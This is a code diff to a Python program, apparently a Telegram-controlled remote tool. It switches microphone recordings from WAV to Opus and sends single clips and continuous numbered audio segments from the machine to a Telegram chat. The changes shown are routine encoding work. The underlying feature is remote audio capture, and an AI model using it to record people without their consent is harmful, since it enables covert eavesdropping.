@@ -1283,18 +1283,19 @@ class MicRecorder:
             n_above   = int(np.sum(np.abs(flat) > self.VAD_THRESHOLD))
             is_silent = (n_above / max(len(flat), 1)) < self.VAD_MIN_RATIO
 
-            # ── Encode to in-memory WAV (stdlib, always available) ───────────
-            buf = io.BytesIO()
-            with wave.open(buf, 'wb') as wf:
-                wf.setnchannels(1)
-                wf.setsampwidth(2)        # int16 = 2 bytes per sample
-                wf.setframerate(sr)
-                wf.writeframes(audio.tobytes())
-            buf.seek(0)
+            # ── Encode: Opus (preferred) → WAV fallback ──────────────────────
+            buf = self._encode_opus(audio, sr)
+            if buf:
+                fmt = "OGG/Opus"
+                buf.name = "mic.ogg"
+            else:
+                buf = self._encode_wav(audio, sr)
+                fmt = "WAV"
+                buf.name = "mic.wav"
 
             size_kb = buf.getbuffer().nbytes / 1024
             self.logger.info(
-                f"Mic done: {size_kb:.1f} KB  silent={is_silent}  "
+                f"Mic done: {size_kb:.1f} KB [{fmt}]  silent={is_silent}  "
                 f"active={n_above}/{len(flat)} samples"
             )
             self.last_error = None
@@ -1307,6 +1308,54 @@ class MicRecorder:
         finally:
             with self._lock:
                 self._recording = False
+
+    # ── encoders ──────────────────────────────────────────────────────────────
+
+    def _encode_opus(self, audio: 'np.ndarray', sr: int) -> Optional[io.BytesIO]:
+        """Encode int16 numpy array to OGG/Opus via pyogg. Returns None if unavailable."""
+        try:
+            import pyogg                                    # pip install pyogg
+            import numpy as np
+
+            buf = io.BytesIO()
+            encoder = pyogg.OpusBufferedEncoder()
+            encoder.set_application("audio")
+            encoder.set_sampling_frequency(sr)
+            encoder.set_channels(1)
+            encoder.set_bitrate(24000)                      # 24 kbps
+
+            writer = pyogg.OggOpusWriter(buf, encoder)
+
+            # Feed in 20 ms frames (320 samples @ 16 kHz)
+            frame_bytes = 320 * 2                           # int16 = 2 bytes
+            raw = audio.flatten().tobytes()
+            for i in range(0, len(raw), frame_bytes):
+                chunk = raw[i:i + frame_bytes]
+                if len(chunk) < frame_bytes:               # pad last frame
+                    chunk = chunk + b'\x00' * (frame_bytes - len(chunk))
+                writer.write(memoryview(bytearray(chunk)))
+
+            writer.close()
+            buf.seek(0)
+            return buf
+        except ImportError:
+            return None
+        except Exception as e:
+            self.logger.warning(f"Opus encoding failed, falling back to WAV: {e}")
+            return None
+
+    @staticmethod
+    def _encode_wav(audio: 'np.ndarray', sr: int) -> io.BytesIO:
+        """Encode int16 numpy array to in-memory WAV (stdlib, always available)."""
+        import wave as _wave
+        buf = io.BytesIO()
+        with _wave.open(buf, 'wb') as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(2)
+            wf.setframerate(sr)
+            wf.writeframes(audio.tobytes())
+        buf.seek(0)
+        return buf
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -2249,13 +2298,15 @@ class TelegramBotManager:
             result = self.mic_recorder.record(dur)
             if result:
                 buf, is_silent = result
-                buf.name = "mic.wav"
                 label = f"🎙️ {'[sessiz] ' if is_silent else ''}Mikrofon — {datetime.now().strftime('%H:%M:%S')}"
                 try:
                     self.bot.delete_message(chat_id, status.message_id)
-                    self.bot.send_audio(chat_id, buf,
-                                        title=label,
-                                        performer=self.identity.display_name())
+                    if getattr(buf, 'name', '').endswith('.ogg'):
+                        self.bot.send_voice(chat_id, buf, duration=dur)
+                    else:
+                        self.bot.send_audio(chat_id, buf,
+                                            title=label,
+                                            performer=self.identity.display_name())
                 except Exception as e:
                     self.bot.send_message(chat_id, f"❌ Ses gönderilemedi: {e}")
             else:
@@ -2297,14 +2348,19 @@ class TelegramBotManager:
                     continue
 
                 segment += 1
-                buf.name = f"mic_{segment}.wav"
                 try:
-                    self.bot.send_audio(
-                        chat_id, buf,
-                        title=f"🎙️ #{segment} — {datetime.now().strftime('%H:%M:%S')}",
-                        performer=self.identity.display_name(),
-                        timeout=60
-                    )
+                    if getattr(buf, 'name', '').endswith('.ogg'):
+                        self.bot.send_voice(chat_id, buf,
+                                            duration=MicRecorder.CHUNK_SECONDS,
+                                            timeout=60)
+                    else:
+                        buf.name = f"mic_{segment}.wav"
+                        self.bot.send_audio(
+                            chat_id, buf,
+                            title=f"🎙️ #{segment} — {datetime.now().strftime('%H:%M:%S')}",
+                            performer=self.identity.display_name(),
+                            timeout=60
+                        )
                 except Exception as e:
                     self.logger.error(f"Mic send error: {e}")
 
